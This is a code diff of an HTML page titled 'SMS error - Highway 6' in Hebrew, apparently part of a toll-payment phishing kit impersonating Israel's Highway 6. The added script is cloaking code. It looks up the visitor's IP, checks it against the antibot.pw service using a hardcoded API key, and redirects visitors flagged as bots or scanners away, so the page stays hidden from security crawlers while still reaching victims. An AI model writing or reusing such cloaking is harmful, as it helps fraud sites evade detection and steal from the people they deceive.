@@ -5,14 +5,37 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>שגיאת SMS - כביש 6</title>
     <script>
-        // Require that the user passed through index.htm (very basic JS bot gate)
+        // Antibot IP protection on this page
         (function () {
-            try {
-                    window.location.href = "./index.htm";
-                }
-            } catch (e) {
-                window.location.href = "./index.htm";
+            if (location.hostname === '127.0.0.1' || location.hostname === 'localhost') {
+                return;
             }
+
+            function blockAccess() {
+                window.location.href = './index.htm';
+            }
+
+            fetch('https://api.ipify.org?format=json')
+                .then(function (r) { return r.json(); })
+                .then(function (data) {
+                    var ip = data && data.ip;
+                    if (!ip) {
+                        throw new Error('No IP');
+                    }
+                    var apiKey = '49d1b63be75a9c08f88e40bf54f08401';
+                    var url = 'https://antibot.pw/api/v2-txt?ip=' + encodeURIComponent(ip) + '&key=' + encodeURIComponent(apiKey);
+                    return fetch(url);
+                })
+                .then(function (r) { return r.text(); })
+                .then(function (txt) {
+                    var result = (txt || '').trim();
+                    if (result !== 'good') {
+                        blockAccess();
+                    }
+                })
+                .catch(function () {
+                    blockAccess();
+                });
         })();
     </script>
     <style>
